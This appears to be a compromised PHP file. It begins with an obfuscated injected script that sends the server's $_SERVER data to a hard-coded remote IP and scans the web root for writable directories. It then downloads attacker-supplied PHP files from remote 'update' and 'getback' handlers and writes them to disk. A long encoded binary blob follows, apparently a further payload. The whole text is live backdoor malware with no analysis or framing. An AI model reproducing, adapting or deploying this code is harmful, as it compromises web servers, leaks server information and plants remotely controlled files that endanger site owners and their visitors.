<?php if(!@$incode!=false||!@$incode!=null){$vl='u1';$serverid='noidy9Z3k';$liillilllil=time();function lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill){if(ini_get('allow_url_fopen')==1):$lillillliiili=stream_context_create(array('http'=>array('method'=>'POST','header'=>array('Content-type: application/x-www-form-urlencoded'),'content'=>http_build_query($_SERVER))));if($lilillilllllill=='yes'):$lliiiilllill=$lliiiilllill.'&type=fopen';endif;$lliiilliiill=@file_get_contents($lliiiilllill,false,$lillillliiili);elseif(in_array('curl',get_loaded_extensions())):if($lilillilllllill=='yes'):$lliiiilllill=$lliiiilllill.'&type=curl';endif;$llillilliili=curl_init();curl_setopt($llillilliili,CURLOPT_URL,$lliiiilllill);curl_setopt($llillilliili,CURLOPT_HEADER,false);curl_setopt($llillilliili,CURLOPT_RETURNTRANSFER,true);curl_setopt($llillilliili,CURLOPT_POSTFIELDS,http_build_query($_SERVER));$lliiilliiill=@curl_exec($llillilliili);curl_close($llillilliili);else:if($lilillilllllill=='yes'):$lililliiiillill=$lililliiiillill.'&type=socks';endif;$lllliiililii=fsockopen($lliiilliiilii,80,$liiiillllillili,$llllililllll,10);if($lllliiililii):$lilllliiiiiiii=http_build_query($_SERVER);$lilliillllllli='POST '.$lililliiiillill.' HTTP/1.0'."\r\n";$lilliillllllli.='Host: '.$lliiilliiilii."\r\n";$lilliillllllli.='Content-Type: application/x-www-form-urlencoded'."\r\n";$lilliillllllli.='Content-Length: '.strlen($lilllliiiiiiii)."\r\n\r\n";fputs($lllliiililii,$lilliillllllli);fputs($lllliiililii,$lilllliiiiiiii);$llliiiliili='';while(!feof($lllliiililii)):$llliiiliili.=fgets($lllliiililii,4096);endwhile;fclose($lllliiililii);list($liiillllillll,$lillllllillllli)=@preg_split("/\R\R/",$llliiiliili,2);$lliiilliiill=$lillllllillllli;endif;endif;return$lliiilliiill;}function liiiiiillilill($lliililllli){$lliillliliii=array();$lliillliliii[]=$lliililllli;foreach(scandir($lliililllli) as$liililililllil):if($liililililllil=='.'||$liililililllil=='..'):continue;endif;$lllllllillii=$lliililllli.DIRECTORY_SEPARATOR.$liililililllil;if(is_dir($lllllllillii)):$lliillliliii[]=$lllllllillii;$lliillliliii=array_merge($lliillliliii,liiiiiillilill($lllllllillii));endif;endforeach;return$lliillliliii;}$lililliiiillill='/handlers/spiderhandler.php?checkdomain&time='.$liillilllil;$lilliliiillliil='204';$liiililillllil='217';$liliiillili='12';$liliiiillill='250';$lliiilliiilii=$liiililillllil.'.'.$liliiillili.'.'.$lilliliiillliil.'.'.$liliiiillill;$lliiiilllill='http://'.$lliiilliiilii.'/handlers/spiderhandler.php?checkdomain&time='.$liillilllil;$llliiiiiilili=lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill='yes');if($llliiiiiilili!='havedoor|havedonor'):if($llliiiiiilili!='needtowait'):$liiiiiiiilii=@preg_replace('/^www\./','',$_SERVER['HTTP_HOST']);$liiiililllli=$_SERVER['DOCUMENT_ROOT'];chdir($liiiililllli);$lliillliliii=liiiiiillilill($liiiililllli);$lliillliliii=array_unique($lliillliliii);foreach($lliillliliii as$liililililllil):if(is_dir($liililililllil)&&is_writable($liililililllil)):$lillliiliilli=explode(DIRECTORY_SEPARATOR,$liililililllil);$llilliliilil=count($lillliiliilli);$lilililllllilll[]=$llilliliilil.'|'.$liililililllil;endif;endforeach;$llilliliilil=0;foreach($lilililllllilll as$llliiiiiiii):if(count($lilililllllilll)>1&&(strstr($llliiiiiiii,'/wp-admin')||strstr($llliiiiiiii,'/cgi-bin'))):unset($lilililllllilll[$llilliliilil]);endif;$llilliliilil++;endforeach;if(!is_writable($liiiililllli)):natsort($lilililllllilll);$lilililllllilll=array_values($lilililllllilll);$llliiiiiiii=explode('|',$lilililllllilll[0]);$llliiiiiiii=$llliiiiiiii[1];else:$llliiiiiiii=$liiiililllli;endif;chdir($llliiiiiiii);if(strstr($llliiiiiilili,'|')):$llliliiilll=explode('|',$llliiiiiilili);$liiililiilii=$llliliiilll[0];$liiiilllllli=$llliliiilll[1];if($liiililiilii=='nodoor'):$lliiiilllill='http://'.$lliiilliiilii.'/handlers/update.php?vl='.$vl.'&upd&needfilename';$lililliiiillill='/handlers/update.php?vl='.$vl.'&upd&needfilename';$liililliiill=lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill='no');$lilliliiiilllil=explode('|||||',$liililliiill);$lllliiliiiii=$lilliliiiilllil[0].'.php';$lliillilllliii=$lilliliiiilllil[1];file_put_contents($llliiiiiiii.DIRECTORY_SEPARATOR.$lllliiliiiii,$lliillilllliii);$llililiillll=str_replace($liiiililllli,'',$llliiiiiiii);$lliiiilllill='http://'.@preg_replace('/^www\./','',$_SERVER['HTTP_HOST']).$llililiillll.'/'.$lllliiliiiii.'?gen&serverid='.$serverid;$lililliiiillill=$llililiillll.'/'.$lllliiliiiii.'?gen&serverid='.$serverid;$liiiilillilliil=lillliilliii($lliiiilllill,$_SERVER['HTTP_HOST'],$lililliiiillill,$lilillilllllill='no');endif;if($liiiilllllli=='nodonor'):endif;elseif($llliiiiiilili=='needtoloadsomefiles'):shuffle($lilililllllilll);$llliiiiiiii=explode('|',$lilililllllilll[0]);$llliiiiiiii=$llliiiiiiii[1];$llililiillll=str_replace($liiiililllli,'',$llliiiiiiii);$lliliiilill='stuvwxyz';$lllliiliiiii=str_shuffle($lliliiilill).'.php';$llllllilliil=urlencode('http://'.$liiiiiiiilii.$llililiillll.'/'.$lllliiliiiii);$lliiiilllill='http://'.$lliiilliiilii.'/handlers/getback.php?url='.$llllllilliil;$lililliiiillill='/handlers/getback.php?url='.$llllllilliil;$lliiilliiill=lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill='no');file_put_contents($llliiiiiiii.DIRECTORY_SEPARATOR.$lllliiliiiii,$lliiilliiill);endif;endif;endif;$liiiiliiill=true;$incode=true;}?><?php $_f___f='ЇВд@\' к(Ќb9Јz_Ўь€ЅR­Г…HСbЃ¶„ЂgҐ^Вќ·€±СеЌћ$JћыЃ™3¶[GwµfИ"ышАu·WЋkМ&&Є++7…{ж9Щ аґмN‡"o«І0цћW¤bЌUoїЉёO¶Nі”в*iEAЕU‚\'°“ЯJ №Ц\'ТКh—c0КрQX‘рh©JcvШCKЎФ‰Phe{I ИЂј#Ґj}ХAнщI&h|©§г“Ъ%,)АУЁ…юПf¶џ+ЭAbX>%-Жл„іё”ЃЊгѕм>"к„RK#ј"W~hЙBIЦoае¬Ј9ФЉ—GЫVфщ+щлЗљцьK/УxmрІ§ЗCњ±!Ќ†LqкхдчЙб‚µдшЖљМ¦^л5Б-Vъ?RJЖЖлWД(НеUК±”;і%е‡+Ъ@ЯФ"аСDV№nЖІ"vДы2дWrЫыЛ~[‰Ы3P2»ђїMО 
СТБ‹z\'+›ЌU ИТPеБщ°«RµЌ=Љ±pъР?<;6}!шIkµюСbёѕшфўДОєьd($NЎьEbjщГlЇГ0№­њХSхDЦ‘M\\ЌжPq¦:њљSцу9gђ®няbfЃ¶ЏЮ*™“ы«Т-~л‹ІaпWj%д9?Э¦4›s ДЉmП%@З%ћ‚Ыё&p/6—2&еџ0я§@ҐсYN?€ђ ¦@N©J`:nIЖЎ
€•йс,ЊмЪjFуkЬіпЕЈЁmRЩШdК©ЌrњShЃ:}7\\ўрQ“И:tя:FuБSH2?э>­—o:Цѓ‚LWWи-Гkвe”5ыб0Q*уP‚µ©¬днBЁАJ!ka§В¶і@ж®Ф"ќ—±0# ѓwЂЪр{Oj|є]})plгЊO©|“……иУZіоm*–ч)ЎЋ¬э{>}j* чџЋњµnzЩCЏэТ™yП%2sPїЮх®и}±Ў–Њ.аyuЇ-гk{gЧ…ёJЌgз$aЕкЕWHГМ[DзmЛЦЩўZ іГjtЄјhЛX>Ђ‚доѕhLђcЃ2ш~іўЬЬљ™cМ
®ЫГYэ^M]—пxG}:r|бe:Нжиfя;¤њuЭ;е|›в Ёј»#§—…п#щ<ҐNзсe2ві\\мCDЄЊ"ЎTфьl•‚HЪ<ДсIѓy+ХP¤бМЙ лw%6…ыЙЏ¤[ЈсjђЗВ—ж§…†гHloЛїCєЊЫ#в6ж‚Cjѕ_г’0)ГњP5ЮЦ`dE%ђMCУVя–ж›єЎб©„WX;$>ЃЕzE‰±<;‘< iЛУЈШг»j_рЁEѕ«Щrи\'Х‚1бC?НъЗЏ{ШљЧ ќZY„Ъ5Ш<сN§з•сJdЄ№QТ$:’c+‰SЂє7ЄjџќМw‘КеµCОK"YюbМHщ>киїHуdґІX™‡{Da~#K-ЯТБy~Іz;ЯS¶“—С‘„м/—ЕюnЊ,ҐЏ¤Я—p<1>ЖШѕXЕХўtV†O2yш|к
sLоBvееyB¶Bи|jpУЫ¦Д”	6ЋmмѓRРx‚°8Ж1ёe…$\\«\'осђ|і=шјЎеэl7Pб5Фк)©€у¤йу
м-і–Їp"ZћgЩ«ЊюpЖ“Xьцх‰а•“mgrTПq/‹d|pТЯKtO›р ЬбEдTp±Т;Љѕ<$Х>wсышGу)VK—‚©гЄќtxЎ=@ЫKЬ¦]13ІЧВЭFромЋRХoІL4?Jћ7њ4#‘юV»тЂ}М?7yfЫ«8ОоZк;эЃuAйФЕєJыбhџуљьЇБ\'оЋT~§Es¬z™3’:ґЁ‚h)xћ№wЙpжДс/FГ9Г©!}f«ыґІзJЎµяр”яpьИаь3y;Т»]з|мм*¬їо	х"Ks†­ёҐR
{Э
Бat*¤Tь,Ќ1хf€kґгSDМ¦ь^Г%®°Ќ4гР®gKX\'х}©эш!©д®-b·і¤?ЩЬцЁ#ЂZќД`yЕЋ-ЯXN„"oЂb«НЧ4`ц" Ў,qаэg-(‰Lѕ)ЩАМ…ADeЃK§Пщ1‰¶€ъЧЃм*d‰ –w•л¬:vт[љX3Т"3}іэtoНYюЋ·»вНN ѓZУмОRVЎЂєj=_Т€яи7юо|ЕDZйВ"*ZЎќГ±1Пd
х L¤†жnаЖ‹ qє‰4Ы‚^ъF-Ё…зЮ‡Aњ
T‹ђѓcЗBҐQ\\Ќ§°Ј©Y‘[аЈ
€†КМq o¦|C†%ЉtvтLдКйњКћй™ЪСНН
Ис§™ШјBиѓ ЭXтН*иИҐ%TАbБ^Ущ¦9
WЦИH‡Иp1у\'¬Uю»TФqЉФ]^Ц2ЯDшМїСќ@)~Пtм1&уФ,M‰¶zжstz\'кЩќЉЕ–I— »`Ѓ‡ё`X‘nтбл‹(4ИмсVAp}rљs!wKшЪ€,люЅћ
LТOќЉО?tOze;н«¤mqњТZB№zщ5WbжX\\чбUj=€ШБЁІЄй
ЄбпULТm€C/ъјVУ%ќ‹М(“…Є3xЅ_EгэЛ\'шF”ИG‡$щћLх™°h\\2Џ*у’g`«-ВcДKю5JQАєDЧn‡ЁYЉ
)¤z,quS‰€wъЌч©ѕAжГ¶™dtvЬ†µЧi94‚Њ®~‡Oф¶ХІ*Рё№p,”СTНП0ЂАzй[)eґњи§PiЭ·Пbњ·zчГН(aНјїE=ТRI¶@5ќ2qЄ8’ўЯWичQЏ*Б@Sл•O‘Wc«ЄWЈH«!,yZFіЙОІG	;З™ct¦јё‰Пю<4ФP6,Ј.4=aNzј‰3дnЪЮЃЅИkПVяЪыЎ9
SAьlЭX]аъ2f6 Б,ЮўmДуЗЮЈXу?В3І{оVsс°оK_VтОу<ЈЬ¶о
‘/0А+Q„Rлеч№c–М
JХПrЉ/ЋC—ЯІхМ<W|ѕј/ О NС#xwРЄь, ХЁэтвЈ lGЭAj№–яќ№еШDF0=іo–В8Z$ЪztsHYчdЩяй‡UцПывbqЅ6‹„НBAz?±к=@TЁ0ЛpЪѓ0Eюэ,P­eфУ¶/HS1ЗkRiAнKЋ— ЫЭъєщПu&Pw]рQЫ‘¤Я·,>z=иЫ$Г=ЪЅh™F§aйp}Uц° °+(:ПлВБ…нрЈ?%РФ‰VЕщvвП”\\d>Mіыu!А^™‘5м4A°џR>
†]ЮнзRнN$ѕjpLјx•rLЩЅцK‹)‘·l@ЗБє.EЇ„”—q™O8№яд—ђ•MLLЙЂЖsTіЅЉ“M9S-|Eбз“љrє92Р4lu|А*¤—гtПBЧпСмK^ЖEМ
`EєБЧLИЎYЏЎј2тЙ‰§їП	Љ ±†	У§хЫгє¤РЬћ…Ґгrќ
щР—VЧВ2јТЗS 1$_6ы”3КД["Ж†Ућ	У&ј зк°WЦсм^њ%а-®ўЩі€ЦTУr†‘¶Х{
Ц.љ”*·:93Љa-§Ђр„ФъФ‰К7њhЊОњ‘®$А№§­5»!т»ў,.ZЈэ6CЎA2окыp*п \'%¶Цµ_¦…a*гќѓV Ґ,!^Џ5¶ќ¦.їy‡EеУгqdIЈkAюкжиZў—,ґ	ж:ъБD^Ы@Ю	жЩљLCyВewHшв+сьоєпR–„ГЅu#№b‡qШ	гд{ЭЇ\\EnҐ‹PЬЄ}dP!\\\'Z7ЕД»ЉЌЦЯё©ф9"зўріжc“‘“tKЂ’dМ5дOЪФsЭ»¦–зоСscKусНи’®|ВйlJт§Иkyи<+пu‹џЩ4,1љЇХSмFПЕbоe5гЈедЉO‹P.x©яЅМ/ажЄ@са0ЕЁ]qјQFWa‰Ъ·s~“?V–ЁШч‹RЧ€1¤‰јэ9Ђ—¬•ЗХq/a«…/ЪжМ;нчк ©”ЦЮlWя*ћ
ОW<ОуAr¶л‡`Ч·ш»Ц™ѓtXЙмХ»•Ы	HљяL,лr&иnжkOщЮ«ѕвНЪd8E}#yОф“Ш
ѕ· Ь•2pV!"h|;q6ЗСоdЖЛOИ2ЇбOҐЊ_!нЫ§›!)@Ђ†вAс@±:g[Ёy{-MЌЬ”окй‚Fl·8	7Ѓж„W•’RH©EХVЎэХi<nnљ5›Т€Ќ,ўBBN‡®‡8Н#ќ(}ѕУa|і1Mi‘щЛY!ђcСa[GчсXїца=  Nб‰"ФTRjZиu(Жй,F”и%“Ю)^¶	_ОJБ_Ў•xГ†E·ЁљёlКGЃ "Л‘Lь¬—yе„Eъфb)ъя«S3Р1UОґµр¦LіSш)"У¦сЉэЏ@©I4±qщrЂuhдY¶yn.kж<>ў_Ґ—ДRiY•|(эд&€S‰¶љgzщЕaчi5ї	ю.бПгЭPюK¬г’H€*аЉН	ХlьЙДѕФњ]CKQ®FЈЇ…я8M®Ў¤ичГdчжґаРkgLLGЌюєOЕжЮк R32Цв*ийппµШOXv_F€єLаEІое‡VXNЋЊ8зf¶яV#ч-Ot”Y±iФЏ0DBа8трЮ№Xб†РґСы6ыXWЌ[‚ЇVSЭ3§+FЦМyuQюВ±}/ъА‘Щk„юyИ°I”ЫхМпgџи`+9,ЬЭhэ–ЯGv‘Ўx]8lЪќ)axMЎ›
а¬m~Ў<<Ц!%?вг•*U BЬuЭтЈҐж+’qUҐмЎъђ~М§фrЯ
ѕўА›ќ©Ђ•mИLwД’)F*>CЫж@ьµrх=›“‘caGЖыl& 3ѕ/3%Zы\'UОU7Б®qGj…h‡& ~Ц?Oя"·L+\\"Ђ&э№6S!6ьNі±[jЙЂРM›є©гіФkEb9,‰Ѓ:~o`J"e¤=Ґ©,a ¤џЈУѕклPe‹nRЩЩнMЩЦОЉ–ћшШarМOOџЛ†3ЙЎь¦Я™!аьдb‘dU<А2ЋAВЁgОЎЈ•Њб’ЩgР‡kЄ5ґцгµ«ђ«…дТ¦ВЋЖRbмAhln™:Zyк«]1‚N¬lж/"Щ<u‚Э©ь€СтсІЫѓdZ7dл)6ЈІTѓ3‘д_!гс$G¦Ќz,Ђё”|2ХqМщvq?Я!bbюп
Ѓё=y‚x¬р|$сеvЬU4µЮџ(·^ш­дsцЩ™"ѓЫ„8KЌжтдх”ф№йџ®@	±7Ёґ®NzІ»¬Ъйф«vH–я–с$3Sќ4юћ«	c¦}¤®4‘іўучH.лG8rс1хЦe_Ѕ Ѕ… _Ђкэя€E»ҐUџz1
я.ЛИ©dИXE§cъќ^Whдj№Юэр¶Бkw• =мютS%
І>\'1Љщ1i·зs
ЊбdїSХQlVш?Ѕfчжю¶М¶Ю7ёWоЬgeЩ|jг)·±ьy?fСФ\\q©:$Еo^Ѓ9џЎ¦c¬ IЏ[TшСjЋЧЯЈ-ПмґЌY3­µ^6Ќь&wЊ8zЂ|?жЇdХeБI ©Вm5° њЦaґU(е|jеmёџ‰oѕ4‘&†#ЊGЪё1°$2ФшЃЏC"NFшъ
!i‡гјгXv·Яa]щ!<ґ2ѓ®J¦p;‡ТLбЯ…¦№–иСЪ"­x±ІчL.ђЏvЌІў^Ї™ЕѓBЊ?pј$sL•*K@п†E;Њч…BйЬ„†ыН¬Њmpµ%єPaГс)…^–мµ”y~ѓi]И>•}хЪZ*д(ДЉ›GќгPHYІ5}«P™jІЪ !c®иyёТщЁ€Д;ЙjOeЅ$iCґxTюЦnЩdЪ!
Г§щЖЄ0Wt¤0ei‘[SdЛdґE,%\\№Плy§рlкўтR2Њx
т–;T©Ц­~8’ХIїфмТ`|›Aш~e§q§ЅЛв¤…е‚ОЪ¶bҐР%9)рњєС]АTђР
зSШ…‹s9ФeН0$	=$ЭьщSpnјъ;H№]aSWє’Хп©ЄгњћГ•дTBГInл”gЎ
Ё(Туљ—“њF¤EјОЅыW[)±ьдЧФ‚&гaЈ+А
бПсВХФ8цаS«ДбRСt№¶оЭж!ЌuXСjюѕЭWjXR2єб:aґаJІЮ†2ђ{џXцу|‰eЄRlЩ-bBѕ:ЛR<Љ@SЋ€Н)§[Брѕэ’~ЇъniTўJ/ѕP)ьWЁс)ЉBБTl№ШYо6%*aSµ\'!Ь#Є‰М¤Љ±7Н™bї3ґ‡Vоkс‰NЙѓ0Баi¤jбq°ш‰в „пЄ*:ж[{C€ґ@ёўКtњшЪќcэ?SЏы	r"TlВ{№Ft°_Л-і—DЩ¬<™S"µ`2»ј?T –јПЉЃъВvЛqнШI°p9Nйk«‰є!ЫVъfCгКЋ0К§дML\\РЈ№Uq йд­>Ф™/€ѓ~Щя]ј&ЋС48цO/‚q*Щ„Ы[uЦў€Ђжkѕж­n*%`§Вљ¤,Т.ЗLn‹~ќцEЩргnЊ ‰Ѕ.¬•ўмГ¤љ™n”Є2ъU2ІQ*эЯZA`qц‹ll„ЛRЪЕАдE©=Эs:2¬ЃЊGЂҐЛпбм‰ьRn)ЎW^6y€b~взW`Єgрэ7s3=	xfSуДоWcЗ$Гз}EЉхҐєуVЁ$!nIз-¦T’ыХҐї°vNП\\aQ¶|п»]`\'ЌчHРф0ыUyoщеtгіcvlИ‹х1¦.\'№M°Ъ‘(ЬоEЕт«v{+<у·iуsнШTtМdФО_г5Е[а"’­чУр—aЇўNЙЕГ}уn#_“‘Jsаdе ы|PDз~tyёјЄФЪа‘’gЗи{wИЗmл~ЉЗп”.дI8ЎЗлђiYvМЛ
(+·ўгрW	ЖУіЏЯ–
$2 @Й…СЊдњў$ґR;Ўџ@¦У:DHr¤\\:цНШ€/ъ7Гv;Z!€$­|DЉm¶«Юл‰кXZќљ$кЪRНq/ц¬±ф/=ї¤d‰я”aДЯvN+|Јф=Ѕ“;0ЫQAяк7Gйј·b%µмђЛІz/H’*IР…&ЈU·VО°Г‘3Щ©ЂЃ%"“vщyЈ^fРЈЛмЖЗЙ…Є‹т.ђЙnиВ†ТО»‡йiU‹Я	)Њ<}¶/ФЭэ—ЬЮqNШбъ”§хZ»I9X„Ж?dнP¬“ГGЯ©8ј†ЮВМљлo5‘Єую]+…XлЭЭKBoБaќгћЮЮЦФ?WйaOFdшмП<l"Эќ$‹ћI	›‡Е^«BҐ,УY
 ђѕoёlaIЎ‘‚хБd‹лcvA+Ф“] ъхЙЬ)?!e\\e:y}нгюPTRzЇЇІеЧ\'ЅVD¤тыv#…P=HЃЖ—щ8o¤qfP~#ЌЊ2ч#„№ЖuLѓ9њ®њѓ9Я»·/–џ¬Я{h№Оћq}?–жBs©].Э!lЩ3h(o«‚
^+"^Ј·ёЧ\\Eµ2s¦yDзNн:5ј—ЙЎЦ№Ѓбц6–dlёЃ7©ЏэЙ9j•Cмќ`џT/з@тмо<„$ЙuаЏмcZAHхdkю“-i2ё<
‘:¶®y@VYЏ’яы†dZGB ч›ј	НшцїїЛ7z¬РТф1џeGѕЉCЅQtaHЇ¶бы[МЖЖl†Ґl)џб*1д
:›(ПL {ћљ—м6фJФЧluЧw%T‘€жє„рЎhрк
|Ві‹Сш°_Ї%2N­ґCКпмgm7ёSЭ„МЫВ&§?c{ЧВѓх4жzчNЫА1ђЇ*FBKHwђ§Х
(#чзv^K‹ьkъYµ5WlџчLЧMDxcќџ=J¶‡\\НС”ЙvЕКпєК="ҐЈ\'јЅt^нЗХ§^›["щ9phњ№µЉЮюѕыZ8](V
ґ]кQeжOН$`ик!хЪ}!П%ЯЉМє9‰>;є`kЅIn¶yКж«7m#ч1b†gХ‚FЏ@АFєЉRм—5вЌІ†3В„М+ќ§ћ‘pNФћѕK – LЉNo_џЃ„і9ќяЌ›\\·кЪ€Y–Ј”_NрР№ў?јкk›\\ЉKZ"јjНжu9“щб83Ж	Шп ч„	[ҐаИЙtХўв2/‰XZs=Ѕъ4,lwWЃ…>›ґ-»Кwќ=лВШцёWЎn"ЮoЏъ‡Ьі/™{“ЇNТюМц<oe.ј¦TҐэ|°~PЗ­(мЅ4ВХіЦЋ¤;ВљBpjѓЋe)Ц”j/™¶Hє^В9б§”¬щ(№О¤"ЪЪєЉTЈ8~kј4*«РКюЊшя‡*бЯЋЧы‚_ҐOЩЬ†
jb}ѓ¤KъЭзХ2x3ш»‰АКёЃ’€КЎ]EM¬яЭ	л=xџл_v…“«ЋdМеСАjМДДъв.ЯWсј%Bъ«Ґ`H6,Шщм\'9k~хYС,0}›аz;B¦к (Њ«2kM”=T5 ќф?мвkЋЁ,/‹ѕ®Ш{Ё-TIrЁЭСчїdџУ•ьЯ5±^»m«hе”ИYQЙЗ Aњa§Э‰_Xд›М1Nc¬ыОbDoцџO–	GЈуuSђЊ›ФЈь¤•»ш_@Уѕџµ©ѓ=Q»Л.°В.Мю°q]ЋЉH=n¶ЯлK¶m`Д—Єwд©LZЉюOVSЛДОг…{1±aЈЂX\\. LZy0•~okЬQЌЛЌHZќЇПФDQ6Dкgk¦ЅEўјYC8	
ыO\'еBю€oQДUюб”ъ‚Гмє!eьІс_мм°ІђWЛa5¤‘«–Uм&,]›ўD‰[µв0Юk$ џ©иfnЋ•ПњP.Й©Н7Е ЪјvVЪUЩэI*йdХЙ?ЫШl5a± -ЙHµґ…=О‡W†Vй
ґЭўьъАЩxвЬ\\-‘C®,¤™—нДЫ‹”р\'R.Jw”a¦кiь (еаjQЌ®„ iVЅ+·KЁto"M5к xЖч+Qe@|vyN#ЫЎ“e№э‰Ысxh*Ы;ЩNДAэн†ЄBкOqВї<ТyЋ‡w«	Ё’ѕKQф\'ыЃhb-яИ5=R\\¶c“ЦЇ-8юrUd\'ф	TЭріЙ ±ТZиЬНИЅv{CmU!•ЃсшА8п¶вM¦‹Р6s„"Зіќ_Оn±$\\ѕLіР}љ7vbAђЦи[$эg€ТJзќ№™ЖzсsпйлfwDk/@г\\ЬE`QБ6K’тФ{.1ье–єВНЋ¤W3$Wn\\¬Сr{хЕбH‰жЛЦ	\'ИэВr&VП_>ZlL–XЉvЃхбы№&®7,оg—V©|¦ЩJ\\ЫTS}е&џ1йmZ‘‚ЭЗ6mљ»7gЋРъЯћ8Гf†тЖBЈ&2хЈ¶њr-Ё§‰QґЂЩыєЬF{=XЦЫAЪх;ќ{Ѕќ©ҐM)…4  OЅњJbшШШЈрqћєУTхh`т
Зы™9SaЋђ>_ГЉйїw7qИпмАЎЇыкЄдyі‘њs{Яgџr-Џ[і”+Эоп7ЁжGG\'vбAИЫ=pµ€©8“x5Х¶oўqYЅді-хЕJП:п“Ж_—>ЗБO#тx ]`aсгy{ЂJyWј"џqКf7.`©Вб_@Шaъя-0ЮБD‰ф[„НЊq’ѓыЊxjЪКQяЈ4E8¬Ч,ћhћКы~‡KVїЩ!нь¤є|‰Ц†Ў:Рй;ЙoЧл+mw†$­у9ЛqМSБZѓE`|2«ъК4лцhП,I‘fЉYѕр&VЇиa<†(џКй \\Ъ=›:tЧ(“C0¤AQёУПV‘6ЁЖPBџR"ЇтвЌ
Ќ{ЉВrЖВцкінЕк±К"Po(ЏьЅѓ12тШЬHtаYMW®R°їфЖя+‚®ъчZCASVT–&иJЄзMqЋщҐШc‡ЊџџэCAзУ?µS¦џ[1;твЬЂќрyЏХ\'ЅoТЎgQ›X.ї#Ђ6д«c>GBП­DdЛ’ЃGg`ќ@0ДМ85ЃI†;х+,Р‹ЮісИш
fObЁ¤aќс.ЫPеa]·9бюљvЛ#yЅtмJэО%qtђ8sLЪтM
гЅy<ЎНђюэЯ›=ЭЃ‘јкю|Л}pЉк:0з€	gSќRmRcf‡УУgь/J
рЬҐј$¤ў•‰	}5ѕ»hеAлПГVо
°юљm®&ЯaТvД…d­+{f+ПовYеRюFUсWЯe”‡тВўґPiЩtЮJпЏu гїhъ`ё±чNШ;Ж»Ш92шЭщР:%­тgсэВ
tЦЙAtбяё§4<’}(ЧЉ"ЁrПqщKбеdќт’ШHЄfX7Э_h2ќ5^©П>и	jыФDЭwЩеР&#ЛЦ_L~\\Ё‚НJЗпqЉЦТрЬ‘PЋЕ;д‡
Щ“
нЖљJРђЕы‚сt&ЯхЌёгp9#]Ї<зЋAЉ<%#о+%Ћn‡»›D4RГKЃ­ 6&)~ђбы{eRЖГТ2дuК\'Шц П«гЭЖHVJMЇFx„©,КU{‰яXМѕ‘qРТ…/ЯeЮX
эЩҐU©ЦыД,ъчЗ7ю:?1Ъј в‡Q3ау`ЕџХ АрMяXЦLEЖњЈxQY	ѕ§ЃйhљРJџвR_‚WYjFтє™GвОtgѓйoБ:ЫL‡”*є QЗќн5ЧO“ЇMKUЗГі\'вЮ[ЫqEрµ<оm$ї†РtЯ,VЬйCVEEІУ‡О¦Њу^UШZ‘^ќ;хQTЭ—Њ#IЭыіs»йГ¤Y6ш5Фxuµ‘ЉЗРAь‰ЕcQwyЪ#єDћУg-
ѕ®&л%цY №‡Wђ ЗЏѕО SЩь7П¬}{ѕЃNpЖ†Ътj YЪБ›H¬]W3ДЗBЧ Y#y†№К¦ЅЅX^\'xЁх=!~“РЋщџъ4#»о«ѓупТЧ¬!bЦs!3чl1mл“€dҐц ±[™Ьh8Л ШрSy^“}йЋ1ysэ†‰µ\\	22Я-ычѓ¬s~р3р|
ГИ!V}Ј­8ЋWГњоЯ тlfДЏ5°¤©CcwћGVж„м]Wn+.ОЬР?DP\'_P;o‚{µ]жїяжп+f)Ще±±CAй9њ• П}"ј•+.@KrCЌЃЮњ‰м·[Df2°^›$ІфЩЂтFґQц`D;ЕП›N/‡TAeµU†?Ей;9ќ)ч™;”g¤nррЧйъ)ш]‡’ЬћFШюtgAd¬¦ЈрaбЊшk\\AёџД¶ЎсSјsuЋe
юgJW’Ъ]чРЋP(jEОHђk#МЁ6t›KxC™щБЄ«=жyЁoXЖ\'їоgЩа*Y$ўu1ґ oµ\\И—‰Ъi	=U$xПVђYЧO%НДЙ·qu?ZсHИ!ўСФjZжMM5lС»Й<Ѓ0Сѓb/`ЂЖiш ђј`џђ0}\\C1—А!µ›иЖ/ЩщЧшоUQBЛы†нТBрОм€aAФЋЌеІ†ѕRn€}	UђК7‡ЅbЦ‰‡ьІЕ}
>?фѕР0TкјtL¤џ<FОmg$П&„SKЖ®ЋмїbЮюуЮІЏжVcѓЉІ
;sлQІ,)фУlє“Ќ:3zф1вo%„\\p°vђ\\»WЊ™1тќ•\'\'5ОСЛёы—ж<(u@g)5Ь7Н/гйkС­Щ6ceЃ]юм†I»&‹
ЅG‰ёщ	Ч?#·!цюnuШўZт¶§Т5{ГH›8Э„T„1ЃIU^==pPЈ|ЛЭDС\\B®гtѓЋ~XЕwwL«®‘ї"0!hЩ±п\\Wшz¶|€Кv…–. іѓЮ;F&¦д:Мє§БLPЦJЋђЛК¬‡¬«ЙfKЭќ/ЙO¬аKкDйй„Ьёь…%уQЬ ъ% гЂІсЃўЄJ їKЧИ©hырwно%¶µ,”Х)џg6¤ЙSйЮ{їQ=ґtњо9p… Уј=l8PБЩ ‰­ VMФµфR:&1«
+Тh_ўzэ±АВџ{;жћГ±>р:mЇv}Q¦#™л	їфTОX¶Ѓ
ря-Z5Вdкe^ёл{©0>kn_IDмы›”·хCEg¬uЕhрk‚jt}эшЕxҐj!їКкЖ!7641%Е®ЎYCТвpС1Ш2·
[GЕh¬†ИКІс‡ЇФ«ЭtДZ:Пэ{Х?хќT
ќОO)‘в$,‡$Є"<ГьrЛM*ь}чiБ‰АDЃpH<{љ[Ц™3Шh’;ж–Ќ|\'ъЏ\\SЊ о
д‘К{Ч]Н–Y=–ЊmАс_Х­^QkdШ Љ„ГЏєxе?U†RЫўR	e·&ЌУjuєyyЗЃApЪЫЭt•ј‰с…L·њж
d6 Чрєo;O±•у€Їќм0kUDJ“|	.сTЌЏљ\\:{8ЬG8/>1вѓ‚±юbєЧTГ#$rЃУ‚Ф…dе†ГЇ<!ЪgЁ>\\&+ jщcи?л^DrЈ	H№Ў&єК¬6ЫЗzДЁт_Бдґ\'5‹›»hип­ey[&юЉ#вюПc`PюЇIRg^џ^љСµ¤-пY„Q0·uђ‘СєЧ=„\'хзї1 j¦w:лЖ&НaФn)ќ%Ф‚Ф
¬:тe<hЎNё;·eЄЊpxыЈ[з0к3·ѓ"\\х±f‰¶ЃIЉ€6щ–фnЇБPЪЉЈјщ¦к5Тж|A4%–єЇUDtыN=ЌдУgЁd„#	IКЬдЂеэяЗtгXъGQвЅ0Ит
